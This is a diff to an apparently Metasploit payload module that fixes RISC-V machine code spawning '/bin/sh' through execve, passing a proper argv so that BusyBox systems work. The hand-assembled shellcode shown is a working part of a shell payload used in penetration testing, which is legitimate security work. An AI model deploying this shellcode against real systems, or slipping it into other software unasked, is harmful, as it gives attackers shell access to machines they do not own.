@@ -4,7 +4,7 @@
 ##
 
 module MetasploitModule
-  CachedSize = 156
+  CachedSize = 164
 
   include Msf::Payload::Single
   include Msf::Payload::Linux
@@ -116,15 +116,18 @@ module MetasploitModule
       0x00000073,                               # ecall
       0xfe0598e3,                               # bnez a1,100b0 <c_dup>
 
-      # execve("/bin/sh", NULL, NULL);
+      # execve("/bin/sh", ["/bin/sh", NULL], NULL);
+      # BusyBox uses argv[0] to select its applet; NULL argv causes "applet not found".
       0x0dd00893,                               # li a7,221
       *load_const_into_reg32(0x6e69622f, 5),    # "/bin"
-      0x00512023,                               # sw t0,0(sp)
+      0x00512023,                               # sw t0,0(sp)      # sp[0..3] = "/bin"
       *load_const_into_reg32(0x0068732f, 5),    # "/sh\0"
-      0x00512223,                               # sw t0,4(sp)
-      0x00010513,                               # mv a0,sp     # path = /bin/sh
-      0x00000593,                               # li a1,0      # argv = NULL
-      0x00000613,                               # li a2,0      # envp = NULL
+      0x00512223,                               # sw t0,4(sp)      # sp[4..7] = "/sh\0"
+      0x00010513,                               # mv a0,sp          # a0 = path = "/bin/sh"
+      0x00212423,                               # sw sp,8(sp)       # argv[0] = &path
+      0x00012623,                               # sw zero,12(sp)    # argv[1] = NULL
+      0x00810593,                               # addi a1,sp,8      # a1 = argv
+      0x00000613,                               # li a2,0           # envp = NULL
       0x00000073                                # ecall
     ].pack('V*')
 
